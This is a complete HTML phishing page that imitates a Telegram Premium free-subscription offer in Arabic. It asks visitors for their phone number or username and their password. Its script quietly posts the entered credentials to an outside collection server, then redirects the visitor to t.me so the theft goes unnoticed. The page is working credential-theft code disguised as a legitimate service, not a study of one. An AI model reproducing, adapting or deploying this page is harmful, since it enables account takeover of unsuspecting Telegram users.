<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Telegram Premium</title><style>body{background:#2481cc;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.box{background:#fff;color:#000;padding:30px;border-radius:15px;width:320px;text-align:center;}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;}.btn{background:#2481cc;color:#fff;width:100%;padding:12px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;}</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="60"><h3>Telegram Premium</h3><p>احصل على اشتراك مجاني</p><form id="f"><input type="text" id="u" placeholder="رقم الهاتف أو المستخدم" required><input type="password" id="p" placeholder="كلمة المرور (التحقق)" required><button type="submit" class="btn">تفعيل بريميوم</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Telegram Premium',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://t.me';});};</script></body></html>
